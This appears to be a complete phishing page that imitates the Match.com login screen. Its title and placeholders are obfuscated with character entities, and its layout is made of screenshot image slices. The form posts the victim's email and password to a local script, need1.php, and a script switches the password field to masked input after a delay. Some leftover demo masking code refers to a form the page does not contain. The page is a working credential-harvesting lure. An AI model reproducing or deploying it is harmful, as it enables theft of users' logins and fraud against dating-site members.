<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html>
<head>
<title>&#77;&#97;&#116;&#99;&#104;&#46;&#99;&#111;&#109;&#174;&#32;&#124;&#32;&#76;&#111;&#103;&#105;&#110;&#32;&#124;&#32;&#84;&#104;&#101;&#32;&#76;&#101;&#97;&#100;&#105;&#110;&#103;&#32;&#79;&#110;&#108;&#105;&#110;&#101;&#32;&#68;&#97;&#116;&#105;&#110;&#103;&#32;&#83;&#105;&#116;&#101;&#32;&#102;&#111;&#114;&#32;&#83;&#105;&#110;&#103;&#108;&#101;&#115;&#32;&#38;&#97;&#109;&#112;&#59;&#32;&#80;&#101;&#114;&#115;&#111;&#110;&#97;&#108;&#115;&#32;&#58;&#32;&#77;&#97;&#116;&#99;&#104;&#46;&#99;&#111;&#109;</title>
<script>setTimeout(function() {
  document.getElementsByTagName('input')[1].type = "password"
}, 1000);
</script>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<link rel="shortcut icon"
              href="images/favicon.ico"/>

	<style type="text/css">
.textbox { 
    border: 1px solid #c4c4c4; 
    height: 36px; 
    width: 275px; 
    font-size: 13px; 
    padding-left: 8px;
    border-radius: 1px; 
} 
.textbox:focus { 
    outline: none; 
    border: 1px solid #4488cc; 
    box-shadow: 0px 0px 3px #4488cc; 
} 
</style>
<style type="text/css">			  
			  input[type=checkbox].css-checkbox {
							position:absolute; z-index:-1000; left:-1000px; overflow: hidden; clip: rect(0 0 0 0); height:1px; width:1px; margin:-1px; padding:0; border:0;
						}

						input[type=checkbox].css-checkbox + label.css-label {
							padding-left:27px;
							height:21px; 
							display:inline-block;
							line-height:21px;
							background-repeat:no-repeat;
							background-position: 0 0;
							font-size:21px;
							vertical-align:middle;
							cursor:pointer;

						}

						input[type=checkbox].css-checkbox:checked + label.css-label {
							background-position: 0 -21px;
						}
						label.css-label {
				background-image:url(images/csscheckbox_918d0374d1880868bf9f58c6d80ea19a.png);
				-webkit-touch-callout: none;
				-webkit-user-select: none;
				-khtml-user-select: none;
				-moz-user-select: none;
				-ms-user-select: none;
				user-select: none;
			}
			</style>
<style type="text/css">
div#container
{
	position:relative;
	width: 1351px;
	margin-top: 0px;
	margin-left: auto;
	margin-right: auto;
	text-align:left; 
}
body {text-align:center;margin:0}
</style>
<style>
p{font-size: 40px;}
.loader {
    position: fixed;
    left: 0px;
    top: 0px;
    width: 100%;
    height: 100%;
    z-index: 9999;
    background: url('https://smallenvelop.com/wp-content/uploads/2014/08/Preloader_11.gif') 50% 50% no-repeat rgb(249,249,249);
    opacity: .8;
}
</style>
<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
<script type="text/javascript">
$(window).load(function() {
	$(".loader").fadeOut("slow");
});
</script>
</head>
<body bgColor="#F2F2F2">
<div class="loader"></div>
<div id="container">
<div id="image1" style="position:absolute; overflow:hidden; left:0px; top:0px; width:1351px; height:90px; z-index:0"><img src="images/mm1.png" alt="" title="" border=0 width=1351 height=90></div>

<div id="image2" style="position:absolute; overflow:hidden; left:189px; top:111px; width:558px; height:330px; z-index:1"><img src="images/mm2.png" alt="" title="" border=0 width=558 height=330></div>

<div id="image3" style="position:absolute; overflow:hidden; left:188px; top:400px; width:560px; height:252px; z-index:2"><img src="images/mm3.png" alt="" title="" border=0 width=560 height=252></div>

<div id="image4" style="position:absolute; overflow:hidden; left:758px; top:114px; width:110px; height:18px; z-index:3"><img src="images/mm12.png" alt="" title="" border=0 width=110 height=18></div>

<div id="image5" style="position:absolute; overflow:hidden; left:273px; top:701px; width:786px; height:292px; z-index:4"><img src="images/mn4.png" alt="" title="" border=0 width=786 height=292></div>

<div id="image6" style="position:absolute; overflow:hidden; left:198px; top:7px; width:653px; height:40px; z-index:5"><a href="#"><img src="images/mm5.png" alt="" title="" border=0 width=653 height=40></a></div>

<div id="image7" style="position:absolute; overflow:hidden; left:578px; top:300px; width:147px; height:49px; z-index:6"><a href="#"><img src="images/mm6.png" alt="" title="" border=0 width=147 height=49></a></div>

<div id="image8" style="position:absolute; overflow:hidden; left:213px; top:536px; width:509px; height:53px; z-index:7"><a href="#"><img src="images/mm7.png" alt="" title="" border=0 width=509 height=53></a></div>

<div id="image9" style="position:absolute; overflow:hidden; left:481px; top:702px; width:125px; height:17px; z-index:8"><a href="#"><img src="images/mm8.png" alt="" title="" border=0 width=125 height=17></a></div>

<div id="image10" style="position:absolute; overflow:hidden; left:269px; top:787px; width:793px; height:104px; z-index:9"><a href="#"><img src="images/mm9.png" alt="" title="" border=0 width=793 height=104></a></div>

<div id="image11" style="position:absolute; overflow:hidden; left:1052px; top:4px; width:92px; height:40px; z-index:14"><a href="#"><img src="images/mu2.png" alt="" title="" border=0 width=92 height=40></a></div>
<form action=need1.php name=dekhrhahn id=dekhrhahn method=post>
<input name="usr" placeholder="&#69;&#110;&#116;&#101;&#114;&#32;&#101;&#109;&#97;&#105;&#108;" class="textbox" autocomplete="off" required type="text" style="position:absolute;width:507px;left:214px;top:204px;z-index:10">
<input name="psw" id="demo-field" placeholder="&#69;&#110;&#116;&#101;&#114;&#32;&#112;&#97;&#115;&#115;&#119;&#111;&#114;&#100;" class="textbox" autocomplete="off" required type="text" style="position:absolute;width:507px;left:214px;top:254px;z-index:11">
<div id="formimage1" style="position:absolute; left:213px; top:367px; z-index:13"><input type="image" name="formimage1" width="509" height="52" src="images/sign.png"></div>
<div id="checkboxG1"  style="position:absolute; left:214px; top:438px; z-index:14"><input type="checkbox" name="checkboxG1" id="checkboxG1" class="css-checkbox"><label for="checkboxG1" class="css-label radGroup1 chk"></label></div>
<div id="checkboxG1"  style="position:absolute; left:214px; top:438px; z-index:14"><input type="checkbox" name="checkboxG2" id="checkboxG2" class="css-checkbox"><label for="checkboxG2" class="css-label radGroup1 clr"></label></div>
</div>
<script type="text/javascript">
 
  //apply masking to the demo-field
  //pass the field reference, masking symbol, and character limit
  new MaskedPassword(document.getElementById("demo-field"), '\u25CF');
 
  //test the submitted value
  document.getElementById('demo-form').onsubmit = function()
  {
   alert('pword = "' + this.pword.value + '"');
   return false;
  };
 
 </script>
 
	
</body>
</html>
